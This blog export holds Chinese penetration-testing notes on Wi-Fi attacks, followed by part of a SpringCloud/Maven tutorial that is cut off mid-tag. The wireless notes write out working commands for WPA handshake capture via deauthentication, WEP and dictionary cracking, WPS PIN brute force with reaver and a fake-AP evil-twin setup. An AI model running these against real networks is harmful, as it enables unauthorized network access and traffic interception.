name&gt;</span><br></pre></td></tr></table></figure><blockquote><p>Filter Options</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200612155352483.png" alt="image-20200612155352483"></p><h4 id="AIREPLAY-NG排错"><a href="#AIREPLAY-NG排错" class="headerlink" title="AIREPLAY-NG排错"></a>AIREPLAY-NG排错</h4><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">Aireplay- ng命令挂起没有任何输出</span><br><span class="line">	无线网卡与<span class="keyword">AP</span>工作在不同信道</span><br><span class="line">报错“write failed: Cannot allocate <span class="keyword">memory</span> wi_ write(): llegal seek"</span><br><span class="line">	无线网卡使用Broadcom芯片(bcm43xx) ，替换为b43驱动可解决</span><br><span class="line">可注入但速度很慢，并提示内核消息“rtc: lost some interrupts at 1024Hz"</span><br><span class="line">	没有修正方法，此时可以启动多个aireplay-ng命令提高速度</span><br><span class="line">使用-<span class="keyword">h</span>参数指定注入<span class="keyword">MAC</span>地址与网卡<span class="keyword">MAC</span>地址不一致报错</span><br><span class="line">	建议保持一致(macchange)，先修改<span class="keyword">MAC</span></span><br></pre></td></tr></table></figure><h4 id="AIREPLAY-NG包注入测试"><a href="#AIREPLAY-NG包注入测试" class="headerlink" title="AIREPLAY-NG包注入测试"></a>AIREPLAY-NG包注入测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">检测网卡是否可以注入包</span><br><span class="line">检测AP的响应时间</span><br><span class="line">	回包率反应链路质量</span><br><span class="line">如果有两个无线网卡，可以检测具体可以注入哪种攻击</span><br><span class="line">基本测试检测AP对probe广播的响应</span><br><span class="line">	向每AP发30包</span><br><span class="line">	网卡成功发送并可接收包的能力</span><br><span class="line"></span><br><span class="line">基本测试</span><br><span class="line">	aireplay -9 wlan2mon</span><br><span class="line">向隐藏AP/指定SSID注入</span><br><span class="line">	aireplay-ng -9 -e leven -a EC:26:CA:FA:02:DC wlan2mon</span><br></pre></td></tr></table></figure><h4 id="MAC地址绑定攻击"><a href="#MAC地址绑定攻击" class="headerlink" title="MAC地址绑定攻击"></a>MAC地址绑定攻击</h4><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">管理员误以为<span class="keyword">MAC</span>绑定是一种安全机制</span><br><span class="line">限制可以关联的客户端<span class="keyword">MAC</span>地址</span><br><span class="line">准备<span class="keyword">AP</span></span><br><span class="line">	<span class="keyword">AP</span>基本配置</span><br><span class="line">	<span class="keyword">Open</span>认证</span><br><span class="line">	开启无线过滤</span><br><span class="line">修改<span class="keyword">MAC</span>地址绕过过滤</span><br></pre></td></tr></table></figure><h4 id="WEP攻击"><a href="#WEP攻击" class="headerlink" title="WEP攻击"></a>WEP攻击</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">WEP密码破解原理</span><br><span class="line">	IV并非完全随机</span><br><span class="line">	每<span class="number">224</span>个包可能出现一次IV重用</span><br><span class="line">	收集大量IV之后找出相同IV及其对应密文，分析得出共享密码</span><br><span class="line">回包中包含IV</span><br><span class="line">IV足够多的情况下，任何复杂程度的wep密码都可以被破解</span><br></pre></td></tr></table></figure><h4 id="WEP共享密钥破解"><a href="#WEP共享密钥破解" class="headerlink" title="WEP共享密钥破解"></a>WEP共享密钥破解</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">启动monitor模式</span><br><span class="line">启动抓包并保存抓包</span><br><span class="line">Deauthentication抓取XOR文件</span><br><span class="line">利用XOR文件与AP建立关联:</span><br><span class="line">	aireplay-ng -1 60 -e kifi -y xxxx.xor -a ap的mac -h 我的mac</span><br><span class="line">执行重放攻击（replay）</span><br><span class="line">Deauthentication 使得已经连接的双方断开重连，触发数据包</span><br><span class="line">收集足够DATA之后破解密码 </span><br><span class="line">Airdump-ng data 查看抓到多少IV值</span><br><span class="line">	官方建议值：</span><br><span class="line">		64bit密钥：25万</span><br><span class="line">		128bit密钥：150万</span><br><span class="line"></span><br><span class="line">使用aircrack-ng xxx.cap破解密码</span><br></pre></td></tr></table></figure><h4 id="WPA-PSK攻击"><a href="#WPA-PSK攻击" class="headerlink" title="WPA PSK攻击"></a>WPA PSK攻击</h4><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">只有一种密码破解方法：</span><br><span class="line">	WPA不存在WEP的弱点</span><br><span class="line">只能暴力破解：</span><br><span class="line">	<span class="meta">CPU</span>资源</span><br><span class="line">	时间</span><br><span class="line">	字典质量： </span><br><span class="line">		网上共享的字典</span><br><span class="line">		泄露密码</span><br><span class="line">		地区电话号码段</span><br><span class="line">		Crunch生成字典</span><br><span class="line">		Kali中自带的字典文件</span><br><span class="line">		</span><br><span class="line">PSK破解过程：</span><br><span class="line">	启动<span class="keyword">monitor</span> </span><br><span class="line">	开始抓包并保存</span><br><span class="line">	Deauthentication攻击（解除认证攻击）获取<span class="number">4</span>步握手信息</span><br><span class="line">	使用字典暴力破解</span><br></pre></td></tr></table></figure><blockquote><p>首先嗅探指定MAC与AP之间的通信，保存cap文件</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo airodump-ng wlan0mon --bssid C0:A5:DD:9D:BA:2E -c 11 -w wpa</span><br></pre></td></tr></table></figure><blockquote><p>在新的窗口对目标连接进行Deauthentication攻击，从而获取四次握手信息</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo aireplay-ng -0 2 -a C0:A5:DD:9D:BA:2E -c 9C:28:F7:91:47:6E wlan0mon</span><br></pre></td></tr></table></figure><blockquote><p>尝试用kali自带的字典rockyou.txt破解密码，字典可以自行选择合适的</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo aircrack-ng -w rockyou.txt /home/tosang/wpa-01.cap</span><br></pre></td></tr></table></figure><h4 id="AIROLIB破解密码"><a href="#AIROLIB破解密码" class="headerlink" title="AIROLIB破解密码"></a>AIROLIB破解密码</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">设计用于存储ESSID和密码列表（本质上就是先计算再使用）</span><br><span class="line">    计算生成不变的PMK (计算资源消耗型)</span><br><span class="line">    PMK在破解阶段被用于计算PTK (速度快，计算资源要求少)</span><br><span class="line">    通过完整性:摘要值破解密码</span><br><span class="line">    SQLite3数据库存储数据</span><br><span class="line">    </span><br><span class="line">echo kifi &gt; essid.txt #保存SSID</span><br><span class="line">airolib-ng db --import essid essid.txt #导入数据库</span><br><span class="line">airolib-ng db --stats #查看数据库</span><br><span class="line">airolib-ng db --import passwd &lt;wordlist&gt; #导入字典</span><br><span class="line">	自动剔除不合格的WPA字典</span><br><span class="line">airolib-ng db --batch #计算hash密钥</span><br><span class="line">	生成PMK</span><br><span class="line">aircrack-ng -r db wpa.cap #使用计算好的数据库去破解</span><br></pre></td></tr></table></figure><h4 id="JTR密码破解"><a href="#JTR密码破解" class="headerlink" title="JTR密码破解"></a>JTR密码破解</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">John the ripper</span><br><span class="line">    快速的密码破解软件</span><br><span class="line">    支持基于规则扩展密码字典</span><br><span class="line">很多人喜欢用手机号码做无线密码</span><br><span class="line">	获取号段并利用JTR规则增加最后厂<span class="number">1</span>位的数字</span><br><span class="line">配置文件/etc/john/john.conf</span><br><span class="line">    [List.Rules:Wordlist]</span><br><span class="line">    $[<span class="number">0</span><span class="number">-9</span>]$[<span class="number">0</span><span class="number">-9</span>]$[<span class="number">0</span><span class="number">-9</span>]</span><br></pre></td></tr></table></figure><h4 id="WPS"><a href="#WPS" class="headerlink" title="WPS"></a>WPS</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">WPS是WiFi联盟2006年开发的一项技术</span><br><span class="line">    通过PIN码来简化无线接入的操作，无需记住PSK</span><br><span class="line">    路由器和网卡各按一个按钮就能接入无线</span><br><span class="line">    PIN码是分为前后各4位的2段共8位数字</span><br><span class="line">安全漏洞</span><br><span class="line">    2011年被发现安全涉及漏洞</span><br><span class="line">    接入发起方可以根据路由器的返回信息判断前4位是否正确</span><br><span class="line">    而PIN码的后4位只有1000种定义的组合(最后一位是checksum)</span><br><span class="line">    所以全部穷举破解只需要1 1000次尝试</span><br><span class="line">   		PSK: 218,340, 105,584,896</span><br><span class="line">	标准本身没有设计锁定机制，目前多个厂商已实现锁定机制</span><br><span class="line">	</span><br><span class="line">启动侦听模式后，发现支持WPS的AP</span><br><span class="line">	wash -C - wlan0mon</span><br><span class="line">	airodump-ng wlanOmon --wps</span><br><span class="line">爆破PIN码</span><br><span class="line">	reaver - wlan0mon -b &lt;AP mac&gt; -VV</span><br><span class="line">秒破PIN码</span><br><span class="line">	reaver wlan0mon -b &lt;AP mac&gt; -vv-K 1</span><br><span class="line">	pixiewps</span><br><span class="line">	只适用于固定厂商的芯片，成功率很低</span><br><span class="line">reaver -i wlanOmon -b &lt;AP mac&gt; -Vv -P 88888888</span><br></pre></td></tr></table></figure><blockquote><p>查看周围AP的wps信息</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200615174111204.png" alt="image-20200615174111204"></p><h4 id="wifite"><a href="#wifite" class="headerlink" title="wifite"></a>wifite</h4><blockquote><p>wifite是一款开箱即用的工具，无需使用各种命令</p></blockquote><h4 id="伪造无线AP"><a href="#伪造无线AP" class="headerlink" title="伪造无线AP"></a>伪造无线AP</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airbase-ng -a &lt;AP mac&gt; --essid “kifi" -C 11 wlan2mon</span><br><span class="line"><span class="meta">	#</span><span class="bash">伪造一个开放AP</span></span><br><span class="line">apt-get install bridge -utils</span><br><span class="line"><span class="meta">	#</span><span class="bash">安装网桥工具</span></span><br><span class="line">brctl addbr bridge</span><br><span class="line">brctl addif Wifi Bridge ethO</span><br><span class="line">brctl addif Wifi- Bridge atO</span><br><span class="line">ifconfig ethO 0.0.0.0 up</span><br><span class="line">ifconfig atO 0.0.0.0 up</span><br><span class="line">ifconfig bridge 192. 168.1.10 up</span><br><span class="line">route add -net 0.0.0.0 netmask 0.0.0.0 gw 192.168.1.1</span><br></pre></td></tr></table></figure><h4 id="3vilTwinAttacker"><a href="#3vilTwinAttacker" class="headerlink" title="3vilTwinAttacker"></a>3vilTwinAttacker</h4><blockquote><p>一款图形化AP伪造工具</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">安装教程如下：</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/P0cL4bs/3vilTwinAttacker.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> 3vilTwinAttacker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chmod +x installer.sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ./installer.sh --install</span></span><br></pre></td></tr></table></figure><h4 id="AIRDECAP-NG进行数据解密"><a href="#AIRDECAP-NG进行数据解密" class="headerlink" title="AIRDECAP-NG进行数据解密"></a>AIRDECAP-NG进行数据解密</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">去除802.1 1头</span><br><span class="line">	airdecap-ng -b &lt;AP MAC&gt; 1 .pcap</span><br><span class="line">解密WEP加密数据</span><br><span class="line">	airdecap-ng -W &lt;WEP key&gt;-b &lt;AP MAC&gt; 1 .pcap</span><br><span class="line">	必须与AP建立关联关系</span><br><span class="line">解密WPA加密数据</span><br><span class="line">	airdecap-ng -e kifi -p &lt;PSK&gt; -b &lt;AP MAC&gt; 1 .pcap</span><br><span class="line">	抓包文件中必须包含4步握手信息，否则无解</span><br></pre></td></tr></table></figure><blockquote><p>首先对我的ap进行抓包，使用wireshake查看如下</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616110428548.png" alt="image-20200616110428548"></p><blockquote><p>可以看到，上面数据包的Data字段是加密数据（均是802.11报头），无法直接查看。下面使用airdecap-ng进行解密（我的密码已经打码）</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616111203921.png" alt="image-20200616111203921"></p><blockquote><p>再次使用wireshake查看，已经是tcp/IP报头</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616112022939.png" alt="image-20200616112022939"></p><h4 id="AIRSERV-NG"><a href="#AIRSERV-NG" class="headerlink" title="AIRSERV-NG"></a>AIRSERV-NG</h4><blockquote><p>AIRSERV-NG可以对AP联网远程操作</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">通过网络提供无线网卡服务器</span><br><span class="line">	某些网卡不支持客户端/服务器模式</span><br><span class="line">启动无线侦听</span><br><span class="line">服务器端</span><br><span class="line">	airserv-ng -P 3333 -d wlan2mon</span><br><span class="line">客户端</span><br><span class="line">	airodump-ng 远程ip:3333</span><br><span class="line">某些防火墙会影响C / S间的通信</span><br></pre></td></tr></table></figure><h4 id="AIRTUN-NG进行入侵检测"><a href="#AIRTUN-NG进行入侵检测" class="headerlink" title="AIRTUN-NG进行入侵检测"></a>AIRTUN-NG进行入侵检测</h4><blockquote><p>Airtun-NG是一个虚拟隧道接口创建工具，可以监视所有加密流量以实现wIDS</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">无线入侵检测wIDS</span><br><span class="line">    无线密码和BSSID</span><br><span class="line">    需要获取握手信息</span><br><span class="line">中继和重放</span><br><span class="line">	Repeate / Replay</span><br><span class="line">	</span><br><span class="line">wIDS</span><br><span class="line">    WEP: airtun-ng -a &lt;AP MAC&gt; -W SKA wlan2mon</span><br><span class="line">    WPA: airtun-ng -a &lt;AP MAC&gt; -p PSK te kifi wlan2mon</span><br><span class="line">    	#开启后使用wireshake监听at0可以实时抓取所有包</span><br><span class="line">    	#也可以启用disniff、driftnet等嗅探工具对at0进行木马嗅探</span><br><span class="line">    ifconfig atO up（先开启后前面的命令才会生效）</span><br><span class="line">    四步握手</span><br><span class="line">    理论_上支持多AP的wlDS,但2个AP以上时可靠性会下降</span><br><span class="line">        WPA: airtun-ng -a &lt;AP MAC&gt; -p PSK -e kif1 wlan2mon</span><br><span class="line">        ifconfig at1 up</span><br><span class="line">        多AP不同信道时airodump -C 1,11 wlan2mon</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud学习总结</title>
    <url>/2020/06/22/SpringCloud%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<blockquote><p>小y的<code>SpringCloud</code>学习总结 :sunny:</p></blockquote><h3 id="SpringCloud介绍"><a href="#SpringCloud介绍" class="headerlink" title="SpringCloud介绍"></a>SpringCloud介绍</h3><ul><li><code>SpringCloud</code>技术概览</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200622113343410.png" alt="image-20200622113343410"></p><a id="more"></a><ul><li>版本选型<ul><li><code>SpringBoot 2.2.x</code> 2.2.2.RELEASE</li><li><code>SpringCloud Hoxton版</code> Hoxton SR1</li><li><code>cloud alibaba</code> 2.1.0.RELEASE</li><li><code>Java</code> Java8</li><li><code>Maven</code> 3.5以上</li><li><code>MySQL</code> 5.7以上</li></ul></li></ul><h3 id="Cloud组件停更说明"><a href="#Cloud组件停更说明" class="headerlink" title="Cloud组件停更说明"></a>Cloud组件停更说明</h3><ul><li><p><strong>服务注册中心</strong>：</p><ul><li><code>Eureka</code>:x:已经不再更新</li><li><code>Zookeeper</code> 缺乏管理面板，使用起来不方便</li><li><code>Nacos</code> 现在最常用的注册中心:heavy_check_mark:</li></ul></li><li><p><strong>服务调用</strong>：</p><ul><li><code>Ribbon</code> 后续会可能弃用</li><li><code>LoadBalance</code> 新推出的服务调用框架</li><li><code>Feign</code> :x:已经弃用</li><li><code>OpenFeign</code> Spring社区自己推出的服务调用组件:heavy_check_mark:</li></ul></li><li><p><strong>服务降级</strong>：</p><ul><li><code>Hystrix</code> 已经弃用:x:</li><li><code>resilience4j</code> 国外推荐用来替换Hystrix的框架</li><li><code>sentienl</code> 阿里新推出的:heavy_check_mark:</li></ul></li><li><p><strong>服务网关</strong>：</p><ul><li><code>Zuul</code> 因为分歧而停更:x:</li><li><code>gateway</code>spring推荐的组件:heavy_check_mark:</li></ul></li><li><p><strong>服务配置</strong>：</p><ul><li><code>Config</code>:x:</li><li><code>Nacos</code> :heavy_check_mark:</li></ul></li><li><p><strong>服务总线</strong></p><ul><li><code>Bus</code> :x:</li><li><code>Nacos</code> :heavy_check_mark:</li></ul><!--more--></li></ul><h3 id="创建工程"><a href="#创建工程" class="headerlink" title="创建工程"></a>创建工程</h3><blockquote><p>POM文件配置，以下是父工程的pom文件内容</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--统一管理jar包版本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>12<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>12<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">junit.version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">junit.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">lombok.version</span>&gt;</span>1.18.10<span class="tag">&lt;/<span class="name">lombok.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">log4j.version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">log4j.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mysql.version</span>&gt;</span>8.0.18<span class="tag">&lt;/<span class="name">mysql.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">druid.version</span>&gt;</span>1.1.16<span class="tag">&lt;/<span class="name">druid.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mybatis.spring.boot.version</span>&gt;</span>2.1.1<span class="tag">&lt;/<span class="name">mybatis.spring.boot.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--子模块继承之后，提供作用：锁定版本+子module groupId和version--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-project-info-reports-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--spring boot 2.2.2--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--spring cloud Hoxton.SR1--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>Hoxton.SR1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--spring cloud 阿里巴巴--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-alibaba-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--mysql--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mysql.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- druid--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;druid.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--mybatis--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mybatis.spring.boot.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--junit--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;junit.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--log4j--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;log4j.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="区别dependencyManagement和dependencies"><a href="#区别dependencyManagement和dependencies" class="headerlink" title="区别dependencyManagement和dependencies"></a>区别dependencyManagement和dependencies</h4><p>​ <code>Maven</code>使用<code>dependencyManagement</code>元素来提供了一种管理依赖版本号的方式。通常会在一个组织或者项目的最顶层的父<code>POM</code>中看到<code>dependencyManagement</code>元素。使用<code>pom.xml</code>中的<code>dependencyManagement</code>元素能让所有在子项目中引用一个依赖而不用显式的列出版本号。<code>Maven</code>会沿着父子层次向上走，直到找到一个拥有<code>dependencyManagement</code> 元素的项目，然后它就会使用这个<code>dependencyManagement</code>元素中指定的版本号。</p><blockquote><p>:star:dependencyManagement只是声明依赖，并不实现引入，因此子项目需要显示的声明需要用的依赖。如果不在子项目中声明依赖，是不会从父项目中继承下来的；只有在子项目中写了该依赖项，并且没有指定具体版本,才会从父项目中继承该项，并且version和scope都读取自父pom；如果子项目中指定了版本号，那么会使用子项目中指定的jar版本。</p></blockquote><h4 id="支付模块构建"><a href="#支付模块构建" class="headerlink" title="支付模块构建"></a>支付模块构建</h4><blockquote><p>需要构建如下图所示的模块</p></blockquote><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200622162958934.png" alt="image-20200622162958934" style="zoom:50%"><p>微服务模块构建流程：</p><ol><li>建module</li><li>改POM</li><li>写YML</li><li>主启动</li><li>业务类</li></ol><h5 id="提供者模块：cloud-provider-payment8001"><a href="#提供者模块：cloud-provider-payment8001" class="headerlink" title="提供者模块：cloud-provider-payment8001"></a>提供者模块：cloud-provider-payment8001</h5><blockquote><p>POM文件如下</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span 